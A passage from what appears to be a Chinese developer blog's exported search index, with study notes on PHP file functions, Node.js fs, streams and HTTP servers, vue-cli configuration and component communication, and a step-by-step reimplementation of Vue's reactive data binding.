unlink(&apos;demo.js&apos;); // `fopen($filename, $mode)`打开文件 // $fp = fopen(&apos;demo.js&apos;, &apos;w&apos;); // `ftruncate($handle, $size)`将文件截取指定长度 // ftruncate($fp, 100); // 对文件内容的操作 // `file_get_contents($filename)`获取文件内容 // $content = file_get_contents(&apos;demo.js&apos;); // print_r($content); // `file_put_contents($filename, $data)`覆盖写入内容 // file_put_contents(&apos;demo.js&apos;, &apos;abc&apos;); // `file($filename)`读取文件内容到数组中 // $fileArr = file(&apos;demo.js&apos;); // print_r($fileArr); // `readfile($filename)`读取文件并写入到缓存 // readfile(&apos;http://baidu.com&apos;); // `fopen($filename, $mode)`打开文件 // `$mode`打开模式 // r只读，将文件指针指向文件头 // r+读写，将文件指针指向文件头 // w只写，将文件指针指向文件头并将文件大小截为0，不存在则创建，也就是覆盖 // w+读写，将文件指针指向文件头并将文件大小截为0，不存在则创建 // a只写，将文件指针指向文件尾，不存在则创建，也就是追加 // a+读写，将文件指针指向文件尾，不存在则创建 // 读取二进制文件要加上b $fp = fopen(&apos;demo.js&apos;, &apos;r+&apos;); // `fwrite($handle, $string)`写入内容 // fwrite($fp, &apos;bb\n&apos;); // `fgetc($handle)`获取一个字符 // echo fgetc($fp); // feof($handle)文件出错或文件结尾变成假 /* while (!feof($fp)) &#123; // `fgets($handle)`一次读取一行 echo fgets($fp); &#125; */ // `fread($handle, $length)`一次读取文件的长度 echo fread($fp, 4); echo &apos;&lt;br&gt;&apos;; // `ftell($handle)`读取指针位置 echo ftell($fp); echo &apos;&lt;br&gt;&apos;; // `fseek($handle, $offset)`移动指针到指定位置 fseek($fp, 6); echo ftell($fp); echo &apos;&lt;br&gt;&apos;; // `rewind($handle)`文件指针设置到文件开头 rewind($fp); echo ftell($fp); echo &apos;&lt;br&gt;&apos;; fclose($fp);?&gt;]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nodejs学习笔记]]></title>
    <url>%2F2018%2F08%2F30%2Fnode.js%20study%20note%2F</url>
    <content type="text"><![CDATA[node内部对模块输出module.exports的实现 变量module是Node在加载js文件前准备的一个变量，并将其传入加载函数 12345678910111213141516171819202122// 准备module对象var module = &#123; id: &apos;hello&apos;, exports: &#123;&#125;&#125;;var load = function(module) &#123; // 读取的hello.js代码 function greet(name) &#123; console.log(&apos;Hello, &apos; + name + &apos;!&apos;); &#125; module.exports = greet; // hello.js代码结束 return module.exports;&#125;;var exported = load(module);// 保存modulesave(module, exported); 默认情况下，Node准备的exports变量和module.exports变量实际上是同一个变量，所以一下两种写法都支持 123456789101112// method 1module.exports = &#123; foo: foo, bar: bar&#125;;ormodule.exports.foo = foo;module.exports.bar = bar;// method 2exports.foo = foo;exports.bar = bar; process 下一轮事件循环 回调123process.nextTick(function() &#123; console.log(&apos;nextTick callback&apos;);&#125;); 程序即将退出 回调 12345process.on(&apos;exit&apos;, function(code) &#123; console.log(&apos;about to exit with code&apos; + code);&#125;);console.log(&apos;nextTick set&apos;); readFile/readFileSync writeFile/writeFileSync stat 异步读取一个文本文件 123456789fs.readFile(&apos;./hello.js&apos;, &apos;utf-8&apos;, function(err, data) &#123; console.log(&apos;read file start...&apos;); if(err) &#123; console.log(err); &#125; else &#123; console.log(data); &#125;&#125;); 异步读取一个二进制文件 12345678910111213fs.readFile(&apos;1.jpg&apos;, function(err, data) &#123; if(err) &#123; console.log(err); &#125; else &#123; // 返回一个buffer对象 console.log(data); // Buffer对象转化成字符串 console.log(data.toString(&apos;utf-8&apos;)); // 文件大小 console.log(data.length + &apos; bytes&apos;); &#125;&#125;); 同步读取一个文件直接返回，读取错误用try…catch捕获 123456789try &#123; var data = fs.readFileSync(&apos;./1.jpg&apos;); console.log(data);&#125;catch(err) &#123; console.log(err);&#125;console.log(&apos;readFileSync ended&apos;); 异步写入一个文件，默认是以UTF-8编码写入文本文件 12345678910var data = &apos;Hello,Node.js&apos;;// var data = fs.readFileSync(&apos;./1.jpg&apos;);fs.writeFile(&apos;output.txt&apos;, data, function(err) &#123; if(err) &#123; console.log(err); &#125; else &#123; console.log(&apos;write file finished&apos;); &#125;&#125;); 同步写入文本到一个文件 123var data = &apos;Hello,Node.js,I am sync data&apos;;fs.writeFileSync(&apos;output.txt&apos;, data);console.log(&apos;writeFileSync ended&apos;); 获取文件信息 1234567891011121314151617181920fs.stat(&apos;./1.jpg&apos;, function(err, stat) &#123; if(err) &#123; console.log(err); &#125; else &#123; // 是否是文件 console.log(&apos;isFile:&apos; + stat.isFile()); // 是否是目录 console.log(&apos;isDirectory:&apos; + stat.isDirectory()); if(stat.isFile()) &#123; // 文件大小 console.log(&apos;size:&apos; + stat.size); // 创建时间，Date对象 console.log(&apos;birth time:&apos; + stat.birthtime); // 修改时间，Date对象 console.log(&apos;modified time:&apos; + stat.mtime); &#125; &#125;&#125;); PS:绝大部分需要在服务器运行期反复执行业务逻辑，必须使用异步代码服务器启动时如果需要读取配置文件，或者结束时需要写入到状态文件时，可以使用同步代码 createReadStream createWriteStream pipe 在node.js中，流也是一个对象，我们只需要响应流的事件就可以了。data事件表示流的数据已经可以读取了，end事件表示这个流已经到末尾了，没有数据可以读取了，error事件表示出错。 1234567891011121314var rs = fs.createReadStream(&apos;./data.txt&apos;, &apos;utf-8&apos;);// data事件可能有多次，每次传递的chunk是流的一部分数据rs.on(&apos;data&apos;, function(chunk) &#123; console.log(&apos;data event:&apos;, chunk);&#125;);rs.on(&apos;end&apos;, function (chunk) &#123; console.log(&apos;end event:&apos;);&#125;);rs.on(&apos;error&apos;, function (chunk) &#123; console.log(&apos;error event:&apos;);&#125;); 以流的形式写入文件，只需要不断调用write()方法，最后以end()结束 12345var ws = fs.createWriteStream(&apos;./data.txt&apos;);ws.write(&apos;user stream write data\n&apos;);ws.write(&apos;loading...\n&apos;);ws.write(&apos;END&apos;);ws.end(); pipe()把一个文件流和另一个文件流串起来，这样源文件的所有数据就自动写入到目标文件里 1234var rs = fs.createReadStream(&apos;./data.txt&apos;);var ors = fs.createReadStream(&apos;./output.txt&apos;);var ws = fs.createWriteStream(&apos;./output.txt&apos;);rs.pipe(ws); 创建一个服务器 123456789101112131415var server = http.createServer(function(request, response) &#123; // http请求头的method和url console.log(&apos;header meathod:&apos;, request.method); console.log(&apos;header url:&apos;, request.url); // 将http响应200写入response，同时设置content-type response.writeHead(200, &#123;&apos;Content-Type&apos;: &apos;text/html&apos;&#125;); // 将http响应的html内容写入response response.end(&apos;&lt;h1&gt;Hello world!&lt;/h1&gt;&apos;);&#125;);server.listen(8080);console.log(&apos;Server is running at http://localhost:8080&apos;); 实现一个文件服务器，拼接访问路径读取本地文件，从命令参数获取root目录，默认是当前目录 12345678910111213141516171819202122232425262728293031323334353637383940414243444546var root = path.resolve(&apos;.&apos;);console.log(&apos;Static root dir:&apos; + root);// 创建服务器 var server = http.createServer(function (request, response) &#123; // node提供url模块解析url字符串 获取url的path var pathname = url.parse(request.url).pathname; if (pathname === &apos;/favicon.ico&apos;) &#123; return; &#125; console.log(&apos;url:&apos;, url.parse(request.url)); // 获取对应本地文件路径 var filepath = path.join(root, pathname); // 读取文件状态 fs.stat(filepath, function (err, stats) &#123; // 文件出错 if (err) &#123; console.log(&apos;file error!&apos;); response.end(&apos;&lt;h1&gt;file error!&lt;/h1&gt;&apos;); return; &#125; // 是文件 if (stats.isFile()) &#123; console.log(&apos;200 &apos; + request.url); response.writeHead(200); // 将文件流导入response fs.createReadStream(filepath).pipe(response); &#125; // 文件不存在 else &#123; console.log(&apos;404 &apos; + request.url); response.writeHead(404); // 将文件流导入response response.end(&apos;&lt;h1&gt;404 not found!&lt;/h1&gt;&apos;); &#125; &#125;);&#125;);server.listen(8080);console.info(&apos;Server is runing at http://localhost:8080/&apos;); express是第一代流行的web框架，它对Node.js的HTTP进行封装，语法基于ES5，要实现异步代码，只有一个方法：回调。 koa2完全基于ES7开发，使用Promise配合async实现异步 1234567891011121314151617181920212223242526272829// 创建一个Koa对象const app = new Koa();// 对于任何请求，app将调用该异步函数处理请求// ctx是koa封装request和response变量// next是koa传入的将要处理下一个异步函数// 每个async函数称为middleware// app.use()顺序决定了middleware的顺序app.use(async(ctx, next) =&gt; &#123; fs.readFile(&apos;./data.txt&apos;, &apos;utf-8&apos;, function(err, data) &#123; console.log(data); &#125;); // 调用下一个middleware，如果没有调用，则下一个middleware不会执行 await next();&#125;);app.use(async(ctx, next) =&gt; &#123; ctx.response.type = &apos;text/html&apos;; ctx.response.body = &apos;&lt;h1&gt;Hello, koa!&lt;/h1&gt;&apos;; console.log(&apos;response end&apos;); // 调用下一个middleware await next();&#125;);app.listen(3000);console.log(&apos;app started at http://localhost:3000/&apos;);]]></content>
      <categories>
        <category>nodejs</category>
      </categories>
      <tags>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue-cli中遇到的坑]]></title>
    <url>%2F2018%2F08%2F30%2Fvue-cli%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91%2F</url>
    <content type="text"><![CDATA[项目构建自动化，错误查起来越来越不知所措，坑很多，踩过后要记录，防止踩第二遍 vue单文件@import css文件，不加~会报错123&lt;style lang=&quot;stylus&quot; scoped&gt;@import &apos;assets/css/variable&apos;&lt;/style&gt; 报错：12345678910[HMR] bundle has 1 errors172:176 ./~/css-loader?&#123;&quot;minimize&quot;:false,&quot;sourceMap&quot;:false&#125;!./~/vue-loader/lib/style-compiler?&#123;&quot;vue&quot;:true,&quot;id&quot;:&quot;data-v-be4708e4&quot;,&quot;scoped&quot;:true,&quot;hasInlineConfig&quot;:false&#125;!./~/stylus-loader?&#123;&quot;sourceMap&quot;:false&#125;!./~/vue-loader/lib/selector.js?type=styles&amp;index=0!./src/components/views/programs/Programs.vueModule build failed: Error: D:\appSoft\wampserver\wamp64\www\iHomed_vue\src\components\views\programs\Programs.vue:200:9 196| &#125; 197| &lt;/script&gt; 198| 199| &lt;style lang=&quot;stylus&quot; scoped&gt; 200| @import &apos;assets/css/variable&apos;----------------^ 201| 正确写法@import &#39;~assets/css/variable&#39; vue-cli中config/index.js配置说明1234567891011121314151617181920212223242526272829303132333435module.exports = &#123; build: &#123; env: require(&apos;./prod.env&apos;), // 使用 config/prod.env.js 中定义的编译环境 index: path.resolve(__dirname, &apos;../dist/index.html&apos;), // 编译输入的 index.html 文件 assetsRoot: path.resolve(__dirname, &apos;../dist&apos;), // 编译输出的静态资源路径 assetsSubDirectory: &apos;static&apos;, // 编译输出的二级目录 assetsPublicPath: &apos;/&apos;, // 编译发布的根目录，可配置为资源服务器域名或 CDN 域名 productionSourceMap: true, // 是否开启 cssSourceMap // Gzip off by default as many popular static hosts such as // Surge or Netlify already gzip all static assets for you. // Before setting to `true`, make sure to: // npm install --save-dev compression-webpack-plugin productionGzip: false, // 是否开启 gzip productionGzipExtensions: [&apos;js&apos;, &apos;css&apos;], // 需要使用 gzip 压缩的文件扩展名 // Run the build command with an extra argument to // View the bundle analyzer report after build finishes: // `npm run build --report` // Set to `true` or `false` to always turn it on or off bundleAnalyzerReport: process.env.npm_config_report &#125;, dev: &#123; // dev 环境 env: require(&apos;./dev.env&apos;), // 使用 config/dev.env.js 中定义的编译环境 port: 8084, // 运行测试页面的端口 autoOpenBrowser: true, // 自动在浏览器中打开 assetsSubDirectory: &apos;static&apos;, // 编译输出的二级目录 assetsPublicPath: &apos;/&apos;, // 编译发布的根目录，可配置为资源服务器域名或 CDN 域名 proxyTable: &#123;&#125;, // 需要 proxyTable 代理的接口（可跨域） // CSS Sourcemaps off by default because relative paths are &quot;buggy&quot; // with this option, according to the CSS-Loader README // (https://github.com/webpack/css-loader#sourcemaps) // In our experience, they generally work as expected, // just be aware of this issue when enabling this option. cssSourceMap: false // 是否开启 cssSourceMap &#125;&#125; 曾经不易理解的两点assetsSubDirectory和assetsPublicPath assetsSubDirectory被webpack编译处理过的资源文件都会在这个build.assetsRoot目录下，如果assetsRoot值是&quot;/web/app&quot;，assetsSubDirectory值为&quot;static&quot;，那么，webpack将把所有资源编译到web/app/static目录下 assetsPublicPath这个是通过http服务器运行的url路径，大多数情况下，这个是根目录（/）。如果你的后台框架对静态资源url前缀有要求，你仅需改变这个参数。比如不用本地的，而用线上的CDN。 父子组件嵌套，各个钩子函数触发顺序偶然看到这个问题：vue中父子组件各个钩子函数触发顺序是怎样的？一时还真背问到了，在项目中添加打印才发现是这样子的 顺序是：先依次触发父级组件beforeCreate、create和beforeMounte，再依次触发子级组件beforeCreate、create、beforeMounte和mounted，最后父级组件mounted 父子组件之间通信，兄弟组件之间通信这个问题基本清晰，在这归纳一下 1. 父组件数据传给子组件通过props属性传递 12&lt;!--父组件--&gt;&lt;parent-component :parent-data="pdata"&gt;&lt;/parent-component&gt; 123456789// 子组件export default &#123; props: &#123; parentData: &#123; type: String, default: '' &#125; &#125;&#125; 2. 子组件传数据给父组件使用$emit派发 12&lt;!--父组件--&gt;&lt;parent-component :parent-data:sync="pdata" @handle-callback="handlerCallback"&gt;&lt;/parent-component&gt; 12345678// 父组件export default &#123; methods: &#123; handlerCallback(params) &#123; // do something &#125; &#125;&#125; 12345678910// 子组件export default &#123; created() &#123; // ... this.$emit('handleCallback', params) // ... this.$emit('update:parentData', someData) &#125;&#125; 3. 兄弟组件数据传递 对于大型项目，用vue官方推荐的vuex EventBus 提取bus.js 123import Vue from 'vue'const bus = new Vue()export default bus 兄弟组件1 发送数据 12345678import bus from './bus'export default &#123; created() &#123; // ... this.$emit('busEvent1', someData) &#125;&#125; 兄弟组件2 接收数据 12345678910import bus from './bus'export default &#123; created() &#123; // ... this.$on('busEvent1', function (data) &#123; console.log(data) &#125;) &#125;&#125; 子组件A $emit派发某个事件，再由父组件@handle-callback=&quot;handlerCallback&quot;监听获取数据，然后，父组件$refs直接访问到子组件B的方法，从而间接实现从子组件A到子组件B的数据传递 props在子组件中被重写报错1vue.esm.js?06e7:591 [Vue warn]: Avoid mutating a prop directly since the value will be overwritten whenever the parent component re-renders. Instead, use a data or computed property based on the prop's value. Prop being mutated: "isShow" 解决方案props传过来的参数通过Vue.$emit提交修改 在props和data中使用this在Vue2.2.2或更高版本才能这样使用，低于这个版本时，注入的值会在props和data初始化之后得到。 对于高阶插件/组件库，解决组件与其子孙组件数据传输问题 解决方案一：$attrs和$listener 使用属性和方法不通过props传递，在子孙组件中直接用$attrs和$listeners接收。不过支持v2.4.0+。 1234567891011121314151617181920 // 父级组件 &lt;ul id="app6"&gt; &lt;item class="item" :model="treeData" :count="123" @abc="function()&#123;&#125;" &gt;&lt;/item&gt;&lt;/ul&gt;// 子孙组件inheritAttrs: false,created () &#123; let attrs = this.$attrs; console.log('mode:', attrs.mode); console.log('count:', attrs.count); let listeners = this.$listeners; console.log('bac:', listeners.abc);&#125; 解决方案二：provide/inject 父级组件传入provide数据选项，子孙组件注入inject数据。 1234567// 父组件provide: &#123; foo: 'bar'&#125;// 子孙组件inject: ['foo'] // or inject: &#123; name: 'foo', defult: '' &#125;]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue-cli</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue的数据驱动原理及简单实现]]></title>
    <url>%2F2018%2F08%2F30%2Fvue%E7%9A%84%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[1、目标实现 理解双向数据绑定原理； 实现{ { } }、v-model和基本事件指令v-bind（:）、v-on（@）； 新增属性的双向绑定处理； 2、双向数据绑定原理vue实现对数据的双向绑定，通过对数据劫持结合发布者-订阅者模式实现的。 2.1 Object.definePropertyvue通过Object.defineProperty来实现数据劫持，会对数据对象每个属性添加对应的get和set方法，对数据进行读取和赋值操作就分别调用get和set方法。 1234567891011121314Object.defineProperty(data, key, &#123; enumerable: true, configurable: true, get: function() &#123; // do something return val; &#125;, set: function(newVal) &#123; // do something &#125;&#125;); 我们可以将一些方法放到里面，从而完成对数据的监听（劫持）和视图的同步更新。 2.2 过程说明实现双向数据绑定，首先要对数据进行数据监听，需要一个监听器Observer，监听所有属性。如果属性发生变化，会调用setter和getter，再去告诉订阅者Watcher是否需要更新。由于订阅者有很多个，我们需要一个消息订阅器Dep来专门收集这些订阅者，然后在监听器Observer和订阅者Watcher之间进行统一管理。还有，我们需要一个指令解析器Complie，对每个元素进行扫描和解析，将相关指令对应初始化成一个订阅者Watcher，并替换模板数据或绑定相应函数。当订阅者Watcher接收到相应属性的变化，就会执行对应的更新函数，从而更新视图。 3、实现ObserverObserver是一个数据监听器，核心方法是我们提到过的Object.defineProperty。如果要监听所有属性的话，则需要通过递归遍历，对每个子属性都defineProperty。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596/** * 监听器构造函数 * @param &#123;Object&#125; data 被监听数据 */function Observer(data) &#123; if (!data || typeof data !== &quot;object&quot;) &#123; return; &#125; this.data = data; this.walk(data);&#125;Observer.prototype = &#123; /** * 属性遍历 */ walk: function(data) &#123; var self = this; Object.keys(data).forEach(function(key) &#123; self.defineReactive(data, key, data[key]); &#125;); &#125;, /** * 监听函数 */ defineReactive: function(data, key, val) &#123; observe(val); Object.defineProperty(data, key, &#123; enumerable: true, configurable: true, get: function() &#123; return val; &#125;, set: function(newVal) &#123; if (newVal === val) &#123; return; &#125; val = newVal; console.log(&quot;属性：&quot; + key + &quot;被监听了，现在值为：&quot; + newVal); updateView(newVal); &#125; &#125;); updateView(val); &#125;&#125;/** * 监听器 * @param &#123;Object&#125; data 被监听对象 */function observe(data) &#123; return new Observer(data);&#125;/** * vue构造函数 * @param &#123;Object&#125; options 所有入参 */function MyVue(options) &#123; this.vm = this; this.data = options.data; // 监听数据 observe(this.data); return this;&#125;/** * 更新视图 * @param &#123;*&#125; val */function updateView(val) &#123; var $name = document.querySelector(&quot;#name&quot;); $name.innerHTML = val;&#125;var myvm = new MyVue(&#123; el: &quot;#demo&quot;, data: &#123; name: &quot;hello word&quot; &#125;&#125;); 4、实现Dep在流程介绍中，我们需要创建一个可以订阅者的订阅器Dep，主要负责手机订阅者，属性变化的时候执行相应的订阅者，更新函数。下面稍加改造Observer，就可以插入我们的订阅器。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182Observer.prototype = &#123; // ... /** * 监听函数 */ defineReactive: function(data, key, val) &#123; var dep = new Dep(); observe(val); Object.defineProperty(data, key, &#123; enumerable: true, configurable: true, get: function() &#123; // 判断是否需要添加订阅者 什么时候添加订阅者呢？ 与实际页面DOM有关联的data属性才添加相应的订阅者 if (Dep.target) &#123; // 添加一个订阅者 dep.addSub(Dep.target); &#125; return val; &#125;, set: function(newVal) &#123; if (newVal === val) &#123; return; &#125; val = newVal; console.log(&quot;属性：&quot; + key + &quot;被监听了，现在值为：&quot; + newVal); // 通知所有订阅者 dep.notify(newVal); &#125; &#125;); updateView(val); // 订阅器标识本身实例 Dep.target = dep; // 强行执行getter，往订阅器中添加订阅者 var v = data[key]; // 释放自己 Dep.target = null; &#125;&#125;/** * 监听器 * @param &#123;Object&#125; data 被监听对象 */function observe(data) &#123; return new Observer(data);&#125;/** * 订阅器 */function Dep() &#123; this.subs = []; this.target = null;&#125;Dep.prototype = &#123; addSub: function(sub) &#123; this.subs.push(sub); console.log(&quot;this.subs:&quot;, this.subs); &#125;, notify: function(data) &#123; this.subs.forEach(function(sub) &#123; sub.update(data); &#125;); &#125;, update: function(val) &#123; updateView(val) &#125;&#125;;// ... PS:将订阅器Dep添加到一个订阅者设计到getter里面，是为了让Watcher初始化进行触发。 5、实现Watcher订阅者Watcher在初始化的时候需要将自己添加到订阅器Dep中，那该如何添加呢？我们已经知道监听器Observer是在get函数执行添加了订阅者Watcher的操作，所以我们只要在订阅者Watcher初始化的时候触发对应的get函数去执行添加订阅者操作。那么，怎样去触发get函数？很简单，只需获取对应的属性值就可以触发了，因为我们已经用Object.defineProperty监听了所有属性。vue在这里做了个技巧处理，就是咋我们添加订阅者的时候，做一个判断，判断是否是事先缓存好的Dep.target，在订阅者添加成功后，把target重置null即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// .../** * 订阅者 * @param &#123;Object&#125; vm vue对象 * @param &#123;String&#125; exp 属性值 * @param &#123;Function&#125; cb 回调函数 */function Watcher(vm, exp, cb) &#123; this.vm = vm; this.exp = exp; this.cb = cb; // 将自己添加到订阅器 this.value = this.get();&#125;Watcher.prototype = &#123; update: function() &#123; this.run(); &#125;, run: function() &#123; var value = this.vm.data[this.exp]; var oldVal = this.value; if (value !== oldVal) &#123; this.value = value; this.cb.call(this.vm, value, oldVal); &#125; &#125;, get: function() &#123; // 缓存自己 做个标记 Dep.target = this; // 强制执行监听器里的get函数 // this.vm.data[this.exp] 调用getter，添加一个订阅者sub，存入到全局变量subs var value = this.vm.data[this.exp]; // 释放自己 Dep.target = null; return value; &#125;&#125;;/** * vue构造函数 * @param &#123;Object&#125; options 所有入参 */function MyVue(options) &#123; this.vm = this; this.data = options.data; observe(this.data); var $name = document.querySelector(&quot;#name&quot;); // 给name属性添加一个订阅者到订阅器中，当属性发生变化后，触发回调 var w = new Watcher(this, &quot;name&quot;, function(val) &#123; $name.innerHTML = val; &#125;); return this;&#125; 到这里，其实已经实现了我们的双向数据绑定：能够根据初始数据初始化页面特定元素，同时当数据改变也能更新视图。 5、实现Compile步骤4整个过程都能有去解析DOM节点，而是直接固定节点进行替换。接下来我们就来实现一个解析器，完成一些解析和绑定工作。 获取页面的DOM节点，遍历存入到文档碎片对象中； 解析出文本节点，匹配”{ { } }”（暂时只做”{ { } }”的解析），用初始化数据替换，并添加相应订阅者； 分离出节点的指令v-on、v-bind和v-model，绑定相应的事件和函数； 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262// .../** * 编译器构造函数 * @param &#123;String&#125; el 根元素 * @param &#123;Object&#125; vm vue对象 */function Compile(el, vm) &#123; this.vm = vm; this.el = document.querySelector(el); this.fragment = null; this.init();&#125;Compile.prototype = &#123; /** * 初始 */ init: function() &#123; if (this.el) &#123; console.log(&quot;this.el:&quot;, this.el); // 移除页面元素生成文档碎片 this.fragment = this.nodeToFragment(this.el); // 编译文档碎片 this.compileElement(this.fragment); this.el.appendChild(this.fragment); &#125; else &#123; console.log(&quot;DOM Selector is not exist&quot;); &#125; &#125;, /** * 页面DOM节点转化成文档碎片 */ nodeToFragment: function(el) &#123; var fragment = document.createDocumentFragment(); var child = el.firstChild; // 此处添加打印，出来的不是页面中原始的DOM，而是编译后的？ // NodeList是引用关系，在编译后相应的值被替换了，这里打印出来的NodeList是后来被引用更新了的 console.log(&quot;el:&quot;, el); // console.log(&quot;el.firstChild:&quot;, el.firstChild.nodeValue); while (child) &#123; // append后，原el上的子节点被删除了，挂载在文档碎片上 fragment.appendChild(child); child = el.firstChild; &#125; return fragment; &#125;, /** * 编译文档碎片，遍历到当前是文本节点则去编译文本节点，如果当前是元素节点，并且存在子节点，则继续递归遍历 */ compileElement: function(fragment) &#123; var childNodes = fragment.childNodes; var self = this; [].slice.call(childNodes).forEach(function(node) &#123; // var reg = /\&#123;\&#123;\s*(.+)\s*\&#125;\&#125;/g; var reg = /\&#123;\&#123;\s*((?:.|\n)+?)\s*\&#125;\&#125;/g; var text = node.textContent; if (self.isElementNode(node)) &#123; self.compileAttr(node); &#125; else if (self.isTextNode(node) &amp;&amp; reg.test(text)) &#123; reg.lastIndex = 0 /* var match; while(match = reg.exec(text)) &#123; self.compileText(node, match[1]); &#125; */ self.compileText(node, reg.exec(text)[1]); &#125; if (node.childNodes &amp;&amp; node.childNodes.length) &#123; self.compileElement(node); &#125; &#125;); &#125;, /** * 编译属性 */ compileAttr: function(node) &#123; var nodeAttrs = node.attributes; var self = this; Array.prototype.forEach.call(nodeAttrs, function(attr) &#123; var attrName = attr.name; // 只对vue本身指令进行操作 if (self.isDirective(attrName)) &#123; var exp = attr.value; // v-on指令 if (self.isOnDirective(attrName)) &#123; self.compileOn(node, self.vm, exp, attrName); &#125; // v-bind指令 if(self.isBindDirective(attrName)) &#123; self.compileBind(node, self.vm, exp, attrName); &#125; // v-model else if (self.isModelDirective(attrName)) &#123; self.compileModel(node, self.vm, exp, attrName); &#125; node.removeAttribute(attrName); &#125; &#125;) &#125;, /** * 编译文档碎片节点文本，即对标记替换 */ compileText: function(node, exp) &#123; var self = this; var exps = exp.split(&quot;.&quot;); var initText = this.vm.data[exp]; // 初始化视图 this.updateText(node, initText); // 添加一个订阅者到订阅器 var w = new Watcher(this.vm, exp, function(val) &#123; self.updateText(node, val); &#125;); &#125;, /** * 编译v-on指令 */ compileOn: function(node, vm, exp, attrName) &#123; // @xxx v-on:xxx var onRE = /^@|^v-on:/; var eventType = attrName.replace(onRE, &quot;&quot;); var cb = vm.methods[exp]; if (eventType &amp;&amp; cb) &#123; node.addEventListener(eventType, cb.bind(vm), false); &#125; &#125;, /** * 编译v-bind指令 */ compileBind: function (node, vm, exp, attrName) &#123; // :xxx v-bind:xxx var bindRE = /^:|^v-bind:/; var attr = attrName.replace(bindRE, &quot;&quot;); var val = vm.data[exp]; node.setAttribute(attr, val); &#125;, /** * 编译v-model指令 */ compileModel: function(node, vm, exp, attrName) &#123; var self = this; var val = this.vm.data[exp]; // 初始化视图 this.modelUpdater(node, val); // 添加一个订阅者到订阅器 new Watcher(this.vm, exp, function(value) &#123; self.modelUpdater(node, value); &#125;); // 绑定input事件 node.addEventListener(&quot;input&quot;, function(e) &#123; var newVal = e.target.value; if (val === newVal) &#123; return; &#125; self.vm.data[exp] = newVal; // val = newVal; &#125;); &#125;, /** * 更新文档碎片相应的文本节点 */ updateText: function(node, val) &#123; node.textContent = typeof val === &quot;undefined&quot; ? &quot;&quot; : val; &#125;, /** * model更新节点 */ modelUpdater: function(node, val, oldVal) &#123; node.value = typeof val == &quot;undefined&quot; ? &quot;&quot; : val; &#125;, /** * 属性是否是vue指令，包括v-xxx:,:xxx,@xxx */ isDirective: function(attrName) &#123; var dirRE = /^v-|^@|^:/; return dirRE.test(attrName); &#125;, /** * 属性是否是v-on指令 */ isOnDirective: function(attrName) &#123; var onRE = /^v-on:|^@/; return onRE.test(attrName); &#125;, /** * 属性是否是v-bind指令 */ isBindDirective: function (attrName) &#123; var bindRE = /^v-bind:|^:/; return bindRE.test(attrName); &#125;, /** * 属性是否是v-model指令 */ isModelDirective: function(attrName) &#123; var mdRE = /^v-model/; return mdRE.test(attrName); &#125;, /** * 判断元素节点 */ isElementNode: function(node) &#123; return node.nodeType == 1; &#125;, /** * 判断文本节点 */ isTextNode: function(node) &#123; return node.nodeType == 3; &#125;&#125;;/** * vue构造函数 * @param &#123;Object&#125; options 所有入参 */function MyVue(options) &#123; this.vm = this; this.data = options.data; this.methods = options.methods; observe(this.data); new Compile(options.el, this.vm); return this;&#125; 这样我们就可以调用指令v-bind、v-on和v-model。 1234567891011121314151617181920212223242526272829303132333435&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;style&gt; .red &#123; color: red; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;demo&quot;&gt; &lt;h2 v-bind:class=&quot;myColor&quot;&gt;&#123; &#123; name &#125; &#125;&lt;/h2&gt; &lt;input type=&quot;text&quot; name=&quot;&quot; v-model=&quot;name&quot;&gt; &lt;button @click=&quot;clickOk&quot;&gt;Ok&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt;var myvm = new MyVue(&#123; el: &quot;#demo&quot;, data: &#123; name: &quot;hello word&quot;, myColor: &quot;red&quot; &#125;, methods: &#123; clickOk: function() &#123; alert(&quot;I am OK&quot;); &#125; &#125;&#125;);setTimeout(function() &#123; myvm.data.name = &quot;wawawa...vue was born&quot;;&#125;, 2000);&lt;/script&gt; 5、其他5.1 proxy代理data可能注意到了，我们不管是在赋值还是取值，都是在myvm.data.someAttr上操作的，而在vue上我们习惯直接myvm.someAttr这种形式。怎样实现呢？同样，我们可以用Object.defineProperty对data所有属性做一个代理，即访问vue实例属性时，代理到data上。很简单，实现如下： 1234567891011121314151617/** * 将数据拓展到vue的根，方便读取和设置 */MyVue.prototype.proxy = function(key) &#123; var self = this; Object.defineProperty(this, key, &#123; enumerable: true, configurable: true, get: function proxyGetter() &#123; return self.data[key]; &#125;, set: function proxySetter(newVal) &#123; self.data[key] = newVal; &#125; &#125;);&#125; 5.2 parsePath上面对于data的操作只是到对于简单的基本类型属性，对于对象属性的改变该怎么更新到位呢？其实，只要深度遍历对象属性路径，就可以找到要访问属性值。 12345678910111213141516171819/** * 根据对象属性路径，最终获取值 * @param &#123;Object&#125; obj 对象 * @param &#123;String&#125; path 路径 * return 值 */function parsePath(obj, path) &#123; var bailRE = /[^\w.$]/; if (bailRE.test(path)) &#123; return &#125; var segments = path.split(&apos;.&apos;); for (var i = 0; i &lt; segments.length; i++) &#123; if (!obj) &#123; return &#125; obj = obj[segments[i]]; &#125; return obj;&#125; 用这个方法替换我们的所有取值操作vm[exp] =&gt; parsePath(vm, exp) 6、新增属性的双向数据绑定6.1 给对象添加属性Vue 